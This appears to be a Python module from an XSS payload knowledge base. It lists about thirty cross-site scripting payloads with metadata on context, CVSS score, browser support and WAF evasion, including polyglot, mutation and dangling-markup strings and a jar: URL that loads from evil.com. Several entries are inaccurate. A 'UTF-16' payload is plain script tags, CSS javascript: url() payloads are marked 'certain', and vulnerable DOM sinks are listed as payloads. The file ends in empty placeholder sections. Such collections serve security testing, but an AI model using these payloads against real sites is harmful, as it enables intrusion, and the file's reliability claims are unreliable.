#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Comprehensive Base Payloads - Part 2
"""

from typing import Dict

from ..models import PayloadEntry


COMPREHENSIVE_BASE_PAYLOADS_PART2: Dict[str, PayloadEntry] = {
    # More advanced encoding payloads
    "encoding_utf7": PayloadEntry(
        payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="UTF-7 encoding bypass",
        tags=["utf7", "encoding", "legacy"],
        browser_support=["edge"],
        reliability="low",
        waf_evasion=True,
    ),
    "encoding_utf16": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="UTF-16 encoding bypass",
        tags=["utf16", "encoding", "unicode"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
        waf_evasion=True,
    ),
    # More CSS advanced attacks
    "css_calc_injection": PayloadEntry(
        payload="calc(1 + url('javascript:alert(1)'))",
        contexts=["css"],
        severity="high",
        cvss_score=7.5,
        description="CSS calc function injection",
        tags=["css", "calc", "function"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "css_transform_injection": PayloadEntry(
        payload="transform: rotate(45deg) url('javascript:alert(1)')",
        contexts=["css"],
        severity="high",
        cvss_score=7.5,
        description="CSS transform injection",
        tags=["css", "transform", "rotate"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More JavaScript advanced payloads
    "js_setTimeout_injection": PayloadEntry(
        payload="setTimeout('alert(1)', 1000)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.8,
        description="setTimeout injection",
        tags=["setTimeout", "timing", "delayed"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "js_setInterval_injection": PayloadEntry(
        payload="setInterval('alert(1)', 1000)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.8,
        description="setInterval injection",
        tags=["setInterval", "repeating", "persistent"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "js_location_hijack": PayloadEntry(
        payload="location.href = 'javascript:alert(1)'",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Location hijacking",
        tags=["location", "navigation", "redirect"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More DOM manipulation payloads
    "dom_innerHTML_injection": PayloadEntry(
        payload="element.innerHTML = userInput",
        contexts=["dom_xss"],
        severity="critical",
        cvss_score=8.8,
        description="innerHTML injection",
        tags=["dom", "innerHTML", "dangerous"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "dom_outerHTML_injection": PayloadEntry(
        payload="element.outerHTML = userInput",
        contexts=["dom_xss"],
        severity="critical",
        cvss_score=8.8,
        description="outerHTML injection",
        tags=["dom", "outerHTML", "replacement"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "dom_insertAdjacentHTML": PayloadEntry(
        payload="element.insertAdjacentHTML('afterend', userInput)",
        contexts=["dom_xss"],
        severity="critical",
        cvss_score=8.8,
        description="insertAdjacentHTML injection",
        tags=["dom", "insertAdjacent", "html"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More comment-based attacks
    "html_comment_css": PayloadEntry(
        payload="<!-- <style>body{background:url('javascript:alert(1)')}</style> -->",
        contexts=["html_comment"],
        severity="medium",
        cvss_score=6.1,
        description="HTML comment with CSS XSS",
        tags=["comment", "css", "style"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "html_comment_meta": PayloadEntry(
        payload="<!-- <meta http-equiv='refresh' content='0;url=javascript:alert(1)'> -->",
        contexts=["html_comment"],
        severity="medium",
        cvss_score=6.1,
        description="HTML comment with meta XSS",
        tags=["comment", "meta", "refresh"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # More protocol-based attacks
    "protocol_jar": PayloadEntry(
        payload="jar:http://evil.com/x.jar!/x.html<script>alert(1)</script>",
        contexts=["url"],
        severity="low",
        cvss_score=4.1,
        description="JAR protocol injection",
        tags=["jar", "url", "archive"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "protocol_chrome_extension": PayloadEntry(
        payload="chrome-extension://<script>alert(1)</script>/manifest.json",
        contexts=["url"],
        severity="low",
        cvss_score=4.1,
        description="Chrome extension protocol injection",
        tags=["chrome-extension", "url", "browser"],
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # More form-based attacks
    "form_button_onclick": PayloadEntry(
        payload='<button onclick="alert(1)">Click me</button>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Button onclick XSS",
        tags=["button", "onclick", "form"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "form_fieldset_legend": PayloadEntry(
        payload="<fieldset><legend><script>alert(1)</script></legend></fieldset>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Fieldset legend XSS",
        tags=["fieldset", "legend", "form"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More advanced payloads
    "advanced_polyglot_2": PayloadEntry(
        payload='javascript:/*--></title></style></textarea></script></xmp><svg/onload=/"+alert(1)+"/>',
        contexts=["html_content", "url", "css"],
        severity="critical",
        cvss_score=8.8,
        description="Advanced polyglot XSS variation",
        tags=["polyglot", "advanced", "multiple-context"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
        waf_evasion=True,
    ),
    "advanced_mutation_2": PayloadEntry(
        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Advanced mutation XSS with image",
        tags=["mxss", "noscript", "image"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "advanced_dangling_2": PayloadEntry(
        payload="'><script>alert(String.fromCharCode(88,83,83))</script>",
        contexts=["html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Dangling markup with char code",
        tags=["dangling", "charcode", "obfuscation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More modern web attacks
    "modern_web_components_2": PayloadEntry(
        payload="<my-app><script>alert(1)</script></my-app>",
        contexts=["custom_elements", "html_content"],
        severity="high",
        cvss_score=7.1,
        description="Web Components XSS",
        tags=["web-components", "modern", "framework"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "modern_pwa_cache": PayloadEntry(
        payload='{"url": "/app.js", "content": "<script>alert(1)</script>"}',
        contexts=["service_worker"],
        severity="high",
        cvss_score=7.8,
        description="PWA cache injection",
        tags=["pwa", "cache", "offline"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More comprehensive payloads
    "comprehensive_16": PayloadEntry(
        payload="<listing><script>alert(1)</script></listing>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Listing element XSS",
        tags=["listing", "legacy", "preformatted"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_17": PayloadEntry(
        payload="<noframes><script>alert(1)</script></noframes>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Noframes element XSS",
        tags=["noframes", "legacy", "frames"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_18": PayloadEntry(
        payload="<noembed><script>alert(1)</script></noembed>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Noembed element XSS",
        tags=["noembed", "legacy", "embed"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_19": PayloadEntry(
        payload="<blink><script>alert(1)</script></blink>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Blink element XSS",
        tags=["blink", "legacy", "deprecated"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "comprehensive_20": PayloadEntry(
        payload="<multicol><script>alert(1)</script></multicol>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Multicol element XSS",
        tags=["multicol", "legacy", "columns"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # Additional payloads to reach 200+
    "final_2": PayloadEntry(
        payload="<layer><script>alert(1)</script></layer>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Layer element XSS",
        tags=["layer", "legacy", "positioning"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "final_3": PayloadEntry(
        payload="<ilayer><script>alert(1)</script></ilayer>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Inline layer element XSS",
        tags=["ilayer", "legacy", "inline"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More HTML5 semantic elements
    # More advanced SVG attacks
    # More WebSocket payloads
    # More Service Worker payloads
    # More WebRTC payloads
    # More GraphQL payloads
    # More Shadow DOM payloads
    # More Custom Elements payloads
    # More HTTP/2 Push payloads
    # More modern framework payloads
    # More advanced encoding payloads
    # More CSS advanced attacks
    # More JavaScript advanced payloads
    # More DOM manipulation payloads
    # More comment-based attacks
    # More protocol-based attacks
    # More form-based attacks
    # More advanced payloads
    # More modern web attacks
    # More comprehensive payloads
    # Additional payloads to reach 200+
}
